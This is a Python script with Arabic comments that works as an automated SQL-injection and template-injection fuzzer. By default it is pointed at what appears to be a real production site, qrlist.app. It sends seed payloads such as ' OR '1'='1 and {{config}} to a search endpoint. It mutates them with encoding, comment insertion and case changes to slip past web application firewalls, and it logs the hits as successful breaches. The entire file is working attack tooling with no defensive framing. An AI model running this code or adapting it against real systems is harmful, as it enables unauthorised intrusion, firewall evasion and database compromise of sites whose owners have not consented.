#!/usr/bin/env python3
"""
🧠 The Shapeshifter v2 - Neural Evolution
يتعلم من كل رد، يتحور، ويبني شجرة هجوم ذكية
"""
import requests, sys, json, os, re, random, string, time, hashlib
from datetime import datetime
from urllib.parse import urlparse
from collections import defaultdict

class ShapeshifterV2:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.memory = defaultdict(dict)  # ذاكرة طويلة المدى
        self.generation = 0
        self.successful = []
        self.session = requests.Session()
        self.intelligence = 0
    
    def log(self, msg): print(f"[🧬] {msg}")
    
    def learn_from_response(self, payload, response):
        """يتعلم من الرد"""
        self.generation += 1
        self.intelligence += 1
        
        # تحليل الرد
        features = {
            "length": len(response),
            "status": response.status_code,
            "has_error": bool(re.search(r'error|sql|mysql|syntax|exception', response.text, re.I)),
            "has_blocked": bool(re.search(r'blocked|forbidden|denied|waf|cloudflare', response.text, re.I)),
            "hash": hashlib.md5(response.text[:500].encode()).hexdigest()
        }
        
        # حفظ في الذاكرة
        self.memory[payload[:50]] = features
        
        # تصنيف
        if features["has_error"] and not features["has_blocked"]:
            self.successful.append(payload)
            self.log(f"   🚨 طفرة ناجحة! ({len(self.successful)})")
            return True
        
        return False
    
    def mutate(self, base_payload):
        """تطوير طفرة جديدة"""
        mutations = []
        
        # 1. ترميز مختلف
        encodings = [
            lambda s: ''.join(f"%{ord(c):02x}" for c in s),
            lambda s: ''.join(f"\\u{ord(c):04x}" for c in s),
            lambda s: s.replace(' ', '/**/'),
            lambda s: s.replace(' ', '%09'),
            lambda s: s.replace("'", "%27"),
        ]
        
        for enc in encodings:
            try:
                mutations.append(enc(base_payload))
            except:
                pass
        
        # 2. إضافة تعليقات عشوائية
        comments = ['/**/', '/*!*/', '-- ', '#', ';--']
        for _ in range(3):
            parts = base_payload.split(' ')
            for i in range(len(parts)-1):
                parts.insert(i*2+1, random.choice(comments))
            mutations.append(' '.join(parts))
        
        # 3. تغيير حالة الأحرف
        mutations.append(''.join(c.upper() if random.random() > 0.5 else c.lower() for c in base_payload))
        
        return list(set(mutations))
    
    def evolve(self, generations=10):
        """التطور عبر الأجيال"""
        self.log(f"🧬 بدء التطور - {generations} أجيال")
        
        # البذور الأولية
        seeds = [
            "' OR '1'='1",
            "admin'--",
            "1' OR 1=1--",
            "' UNION SELECT NULL--",
            "{{7*7}}",
            "${7*7}",
            "{{config}}",
        ]
        
        current_gen = seeds
        
        for gen in range(generations):
            self.log(f"\n🔬 الجيل {gen+1}:")
            
            next_gen = []
            for payload in current_gen[:5]:
                # تجربة الـ payload الأصلي
                try:
                    r = self.session.get(f"{self.target}/api/stores?q={payload}", timeout=3)
                    if self.learn_from_response(payload, r):
                        return payload
                except:
                    pass
                
                # تطوير طفرات جديدة
                mutations = self.mutate(payload)
                next_gen.extend(mutations)
                
                # تجربة الطفرات
                for mut in mutations[:3]:
                    try:
                        r = self.session.get(f"{self.target}/api/stores?q={mut}", timeout=3)
                        if self.learn_from_response(mut, r):
                            return mut
                    except:
                        pass
                
                time.sleep(0.5)
            
            current_gen = list(set(next_gen))[:10]
        
        return None
    
    def run(self):
        self.log(f"🧬 Shapeshifter v2: {self.target}")
        self.log("═" * 60)
        
        result = self.evolve(10)
        
        self.log(f"\n🧠 Intelligence: {self.intelligence}")
        self.log(f"✅ Successful mutations: {len(self.successful)}")
        
        if result:
            self.log(f"💣 اختراق! {result}")
        else:
            self.log("❌ الجدار صامد بعد 10 أجيال")
        
        # حفظ الذاكرة
        os.makedirs("logs/shapeshifter", exist_ok=True)
        fname = f"logs/shapeshifter/v2_brain_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"intelligence":self.intelligence,"successful":self.successful,"memory":dict(self.memory)}, f, indent=2)
        self.log(f"📁 {fname}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ShapeshifterV2(target).run()
